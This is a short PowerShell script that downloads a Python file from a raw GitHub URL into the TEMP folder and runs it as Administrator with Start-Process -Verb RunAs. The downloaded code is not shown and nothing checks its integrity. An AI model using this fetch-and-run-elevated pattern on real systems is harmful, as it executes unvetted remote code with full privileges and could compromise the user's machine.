# Define URL and destination path
$url = "https://raw.githubusercontent.com/HTKyuu/WindowsGALIL/main/main2.py"
$destination = "$env:TEMP\main.py"


# Download the file
Invoke-WebRequest -Uri $url -OutFile $destination


# Define the command to run Python script
$pythonExe = "python"
$arguments = "`"$destination`""


# Start the process as Administrator
Start-Process -FilePath $pythonExe -ArgumentList $arguments -Verb RunAs
